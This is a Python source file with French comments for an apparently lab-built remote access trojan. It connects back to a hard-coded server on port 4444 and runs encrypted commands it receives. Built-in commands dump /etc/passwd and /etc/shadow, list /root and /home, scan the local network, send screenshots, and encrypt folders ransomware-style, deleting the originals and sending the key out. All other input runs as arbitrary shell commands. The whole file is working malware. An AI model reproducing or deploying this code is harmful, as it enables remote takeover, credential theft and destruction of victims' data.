import socket
import subprocess
import os
from cryptography.fernet import Fernet

SERVER_IP = "192.168.161.130"
SERVER_PORT = 4444


# On charge la meme cle que le serveur
try:
    with open("secret.key", "rb") as key_file:
        KEY = key_file.read()
    cipher = Fernet(KEY)
except FileNotFoundError:
    print("[-] Erreur: Fichier secret.key introuvable.")
    exit(1)


def execute_cmd(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout + res.stderr
    except Exception as e:
        return str(e)


def encrypt_folder(chemin):
    try:
        if not os.path.isdir(chemin):
            return f"Erreur: {chemin} n'est pas un dossier"
        
        clef = Fernet.generate_key()
        fernet = Fernet(clef)
        compteur = 0
        
        for racine, dossiers, fichiers in os.walk(chemin):
            for nom in fichiers:
                if nom.endswith('.enc'):
                    continue
                    
                filepath = os.path.join(racine, nom)
                try:
                    with open(filepath, "rb") as f:
                        contenu = f.read()
                    chiffre = fernet.encrypt(contenu)
                    
                    with open(filepath + ".enc", "wb") as f:
                        f.write(chiffre)
                    
                    os.remove(filepath)
                    compteur += 1
                except Exception:
                    pass 
                    
        return f"{compteur} fichiers chiffres dans {chemin}\nCLEF:{clef.decode()}"
    except Exception as e:
        return f"Erreur chiffrement: {e}"


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_IP, SERVER_PORT))
        local_ip = sock.getsockname()[0]
        
        sock.send(f"{socket.gethostname()} - {local_ip} - Linux".encode())
        
    except Exception as e:
        print(f"Erreur de connexion : {e}")
        return

    while True:
        try:
            data_recue = sock.recv(4096)
            if not data_recue:
                break
            
            if data_recue == b"exit":
                break
            
            cmd = cipher.decrypt(data_recue).decode('utf-8').strip()

        except Exception as e:
            print(f"[-] Erreur de dechiffrement : {e}")
            continue 

        
        if cmd == "passwd":
            resultat = execute_cmd("cat /etc/passwd")
        elif cmd == "shadow":
            resultat = execute_cmd("cat /etc/shadow")
        elif cmd == "list_root":
            resultat = execute_cmd("ls -laR /root")
        elif cmd == "list_home":
            resultat = execute_cmd("ls -laR /home")
            
        elif cmd.startswith("encrypt "):
            chemin = cmd.split(" ", 1)[1]
            resultat = encrypt_folder(chemin)

        
        elif cmd.startswith("scan "):
            cible = cmd.split(" ")[1]
            base_ip = ".".join(cible.split(".")[:3]) + "."
            
            ports_ouverts = []
            # On scanne les 20 premieres IP du reseau sur des ports classiques
            for i in range(1, 255):
                ip = base_ip + str(i)
                for port in [21, 22, 80, 443, 3389]:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.05) # Timeout court pour aller vite
                    if s.connect_ex((ip, port)) == 0:
                        ports_ouverts.append(f"{ip}:{port}")
                    s.close()
            
            if ports_ouverts:
                resultat = "Services trouves:\n" + "\n".join(ports_ouverts)
            else:
                resultat = "Aucun service trouve sur la plage."
        

        elif cmd == "screenshot":
            os.system("scrot /tmp/screen.png")
            try:
                with open("/tmp/screen.png", "rb") as f:
                    sock.send(f.read())
            except FileNotFoundError:
                err_msg = cipher.encrypt(b"Erreur: capture impossible (pas d'ecran)")
                sock.send(err_msg)
            continue  
            
        else:
            resultat = execute_cmd(cmd)

        try:
            resultat_encrypted = cipher.encrypt(resultat.encode())
            sock.send(resultat_encrypted)
        except Exception as e:
            print(f"[-] Erreur lors du chiffrement de la reponse : {e}")

    sock.close()

if __name__ == "__main__":
    main()